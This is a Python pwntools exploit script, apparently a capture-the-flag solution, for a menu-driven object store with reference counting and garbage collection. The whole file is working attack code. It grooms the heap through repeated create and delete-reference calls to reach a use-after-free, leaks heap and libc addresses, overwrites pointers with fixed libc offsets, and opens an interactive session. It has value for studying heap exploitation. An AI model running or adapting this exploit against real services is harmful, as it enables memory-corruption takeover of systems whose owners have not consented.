from pwn import *
#context.log_level= 'debug'
HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  r = remote(HOST,PORT)
else:
  r = remote('192.168.33.10',PORT)

def create(name, string):
   r.sendline("1")
   print r.recvuntil("name: ")
   r.sendline(name)
   print r.recvuntil("string : ")
   r.sendline(string)
   print r.recvuntil(">> ")

def edit(src, dest, string):
   r.sendline("2")
   print r.recvuntil(": ")
   r.sendline(src)
   print r.recvuntil(": ")
   r.sendline(dest)
   print r.recvuntil(": ")
   r.sendline(string)
   print r.recvuntil(">> ")

def addRef(src, dest):
        r.sendline("3")
        print r.recvuntil(": ")
        r.sendline(src)
        print r.recvuntil(": ")
        r.sendline(dest)
        print r.recvuntil(">> ")
def show(src,dest):
        r.sendline("5")
        print r.recvuntil(": ")
        r.sendline(src)
        print r.recvuntil(": ")
        r.sendline(dest)


def delRef(src, dest):
   r.sendline("4")
   print r.recvuntil(": ")
   r.sendline(src)
   print r.recvuntil(": ")
   r.sendline(dest)
   print r.recvuntil(">> ")

print r.recvuntil(">> ")


create("shit1", "fuck")
create("shit2", "fuck")

for i in range(15):
   create(str(i), "A"*0x10) # 1, 2, ... , 15

addRef("shit1", "shit1") # shit1 -> shit

for i in range(15):
   addRef("shit1", str(i)) # shit1 -> 1, 2, ... , 15

for i in range(14):
   for i in range(15):
      create(str(0x41+i), "A"*500) # to triger gc 15 times
      delRef("root", str(0x41+i))

for i in range(15):
   delRef("shit1", str(i)) # delete 1, 2, ... , 15
   delRef("root", str(i)) # because to make gcCnt of 1, 2, ... to 1, not 15.
for i in range(15):
   create(str(i), "A"*0x10) # link new memory to shit1
   addRef("shit1", str(i))

for i in range(30):
   create(str(0x41+i), "A"*300)
   if( i == 20):
    create("PWND","1234")
   delRef("root", str(0x41+i))
show("shit1","")
heap = u64(r.recvuntil('>>')[0:6]+'\x00\x00')
print hex(heap)
dat = p64(heap-0x2750-0x30)*0x10
create("FAKE",dat)
raw_input()
edit("shit1","A"*44,"A"*0x48+p64(heap-0x3c30)[0:6])
show("PWND","\xf1")
libc = u64(r.recvuntil('>>')[0:6]+'\x00\x00') - 0x3c4c58
print hex(libc)
fake = 0x3c4ae0
dat = p64(libc+0x3c4ae0)*0x10
create("PWN",dat)
edit("shit1","A"*0x50+p64(heap-0x3c30)[0:6],"A"*0x48+p64(heap-0x3c10)[0:6])
raw_input()
edit("PWND",p64(libc+0x85a00)[:6],"ABCD")
'''
for i in range(9):
   create(str(0x41+i), "P"*300)
'''
r.interactive()
